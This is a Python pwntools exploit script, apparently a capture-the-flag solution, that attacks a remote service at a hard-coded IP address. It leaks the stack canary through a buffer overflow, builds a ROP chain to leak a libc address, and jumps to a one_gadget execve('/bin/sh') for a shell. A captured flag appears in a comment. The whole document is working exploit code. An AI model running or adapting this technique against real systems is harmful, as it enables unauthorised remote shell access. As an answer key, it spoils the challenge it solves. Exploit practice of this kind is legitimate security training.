from pwn import *
from LibcSearcher import *

io = remote("182.116.62.85", 27056)
libc = ELF("./libc-2.27.so")

payload = "a"*(0x50-8)
io.recvuntil("Do you know how to do buffer overflow?\n")
io.sendline(payload)


io.recvuntil("a"*0x48)
canary = u64(io.recv(8)) - 0xa
print(hex(canary))

pop_rdi = 0x400863
puts_plt = 0x4005B0
puts_got = 0x601018
main = 0x400789
ret = 0x4006E2
payload = "a"*0x48 + p64(canary) + "a"*8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
io.recvuntil("Try harder!")
io.sendline(payload)

io.recvline()
addr = u64(io.recvuntil("\n")[:-1].ljust(8, "\x00"))
print(hex(addr))

# time 2
base = addr - libc.symbols["puts"]
system = base + libc.symbols["system"]
binsh = base + libc.search("/bin/sh").next()
one_gadget = [base + 0x4f3d5, base + 0x4f432, base + 0x10a41c]


payload = "a"*(0x50-8)
io.recvuntil("Do you know how to do buffer overflow?\n")
io.sendline(payload)

io.recvuntil("a"*0x48)
canary = u64(io.recv(8)) - 0xa
print(hex(canary))


payload = "a"*0x48 + p64(canary) + "a"*8 + p64(one_gadget[2])
io.recvuntil("Try harder!")
io.sendline(payload)

'''
0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a41c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
# flag{25e96197d4da10748a055753b5104856}
io.interactive()